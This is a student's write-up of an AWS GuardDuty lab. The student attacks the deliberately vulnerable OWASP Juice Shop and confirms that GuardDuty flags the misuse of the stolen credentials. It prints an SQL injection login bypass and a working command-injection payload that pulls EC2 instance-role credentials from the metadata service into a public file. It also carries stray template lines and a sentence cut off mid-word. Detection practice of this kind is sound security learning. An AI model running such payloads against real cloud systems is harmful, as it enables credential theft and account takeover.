<img src="https://cdn.prod.website-files.com/677c400686e724409a5a7409/6790ad949cf622dc8dcd9fe4_nextwork-logo-leather.svg" alt="NextWork" width="300" />

# Threat Detection with GuardDuty

**Project Link:** [View Project](http://learn.nextwork.org/projects/aws-security-guardduty)

**Author:** seventeen inch  
**Email:** seventeeninchx17@gmail.com

---

![Image](http://learn.nextwork.org/heartfelt_vermilion_gentle_lemon_balm/uploads/aws-security-guardduty_v1w2x3y4)

---

## Introducing Today's Project!

### Tools and concepts

The services I used were cloud formation, guard duty and A vulnerable web app which was OWASP Juice shop. Key concepts I learnt include IAC, red teaming fundamentals, AWS configs and what not.

### Project reflection

This project took me approximately 1 hr to complete and the detailed documentation and understanding of each services took 2 hrs

I was learning cloud security and this project aligns correctly with it and I got to learn a lot through this project.

---

## Project Setup

To set up for this project, I deployed a CloudFormation template that launches... The three main components are.
Your web app is being hosted by a web server i.e. an EC2 instance! This means the EC2 instance is responsible for being the engine for running the web app's files, processing requests from incoming traffic, and sending responses. The template also stores the web app files in the EC2 instance itself. 

There are also networking resources that are responsible for hosting this web app somewhere in the AWS environment. Usually, when you launch a new EC2 instance, the instance goes straight into a default VPC in your account. But, this template creates a new VPC and networking resources that this EC2 instance will live in. This follows best practice principles - by creating entirely networking resources, people deploying this template can keep the settings in their default VPC. 

A CloudFront distribution is also deployed to speed up the delivery of your web app. Once web a

Start your answer with 'The web app deployed is called OWASP juice shop. To practice my GuardDuty skills, I will Attack the web app and see if the guard duty is detecting it or not.



AWS GuardDuty is a threat detection service, which means it helps you find potential security risks or attacks in your apps and AWS environment.

It uses machine learning to look for unusual activity in your AWS account, like your network traffic and CloudTrail activity logs. If it finds something suspicious, it will alert you so you can investigate.

![Image](http://learn.nextwork.org/heartfelt_vermilion_gentle_lemon_balm/uploads/aws-security-guardduty_n1o2p3q4)

---

## SQL Injection

SQL injection is web app vulnerabilty in which atttackers inject malicious SQL command to access data, bypass authentication. 


What you've entered manipulates the SQL query used for login. The ' or 1=1;-- part makes the query always evaluate to true, which lets you avoid the authentication check.

![Image](http://learn.nextwork.org/heartfelt_vermilion_gentle_lemon_balm/uploads/aws-security-guardduty_h1i2j3k4)

---

## Command Injection

Next, I used command injection, which is another web app vuln that executes a malicious command instead of doing whats its supposed to do. The Juice Shop web app is vulnerable to this because its not having proper input sanitization.

Start your answer with 'To run command injection, I ran a java script command. The script will give the aws credentials.
payload:
#{global.process.mainModule.require('child_process').exec('CREDURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/;TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` && CRED=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" -s $CREDURL | echo $CREDURL$(cat) | xargs -n1 curl -H "X-aws-ec2-metadata-token: $TOKEN") && echo $CRED | json_pp >frontend/dist/frontend/assets/public/credentials.json')}


![Image](http://learn.nextwork.org/heartfelt_vermilion_gentle_lemon_balm/uploads/aws-security-guardduty_t3u4v5w6)

---

## Attack Verification

To verify the attack's success, I went into the path where the credentials are saved and The credentials page showed me 

![Image](http://learn.nextwork.org/heartfelt_vermilion_gentle_lemon_balm/uploads/aws-security-guardduty_x7y8z9a0)

---

## Using CloudShell for Advanced Attacks

The attack continues in CloudShell, because most of the time the hacker will get access to the shell. and their whole process will be carried on through shell. So its better to follow the same way because we are wearing the same hat as a hacker now.

wget is a command-line tool used to download files from the internet.
cat is used to display what's inside a file, while jq is used to process JSON data.

We're creating a new profile in CloudShell, called stolen, to use the stolen credentials we've extracted from our attack on the web application.

![Image](http://learn.nextwork.org/heartfelt_vermilion_gentle_lemon_balm/uploads/aws-security-guardduty_j9k0l1m2)

---

## GuardDuty's Findings

After performing the attack, GuardDuty reported a finding within few mins and findings are The API SendHeartBeat was invoked using root credentials and Credentials for the EC2 instance role NextWork-GuardDuty-project-athul-TheRole-hzyrP71wSEo5 were used from a remote AWS account.

 GuardDuty detected something very suspicious. The security credentials you gave to an EC2 instance (i.e. the web app server) is being used by another AWS account!

As a reminder, CloudShell runs in a temporary account separate from your own AWS account. So, using CloudShell running commands using the stolen profile is definitely unusual to GuardDuty. Only one thing should be able to use those credentials, and it's the web server - not a profile from another AWS account.



The Resource affected, which tells you the attack used an IAM role to access your juice shop's S3 bucket.
The Action, which tells you that an object (i.e. the important information text file) was retrieved.
The Location and IP address of the attacker, which would be a location in your AWS Region at the time of using CloudShell.

![Image](http://learn.nextwork.org/heartfelt_vermilion_gentle_lemon_balm/uploads/aws-security-guardduty_v1w2x3y4)

---

## Extra: Malware Protection

For my project extension, I enabled Malware protection for gfor S3  

To test Malware Protection, I uploaded a sample malware The uploaded file won't actually cause damage because it will make the detection system thinking that it is a actual malware. It is actually harm less.

Once I uploaded the file, GuardDuty instantly triggered and showed the alert which was A malware scan on your S3 object malware.txt.txt has detected a security risk EICAR-Test-File (not a virus). This verified that malware protection is woking perfectly



![Image](http://learn.nextwork.org/heartfelt_vermilion_gentle_lemon_balm/uploads/aws-security-guardduty_sm42x3y4)

---
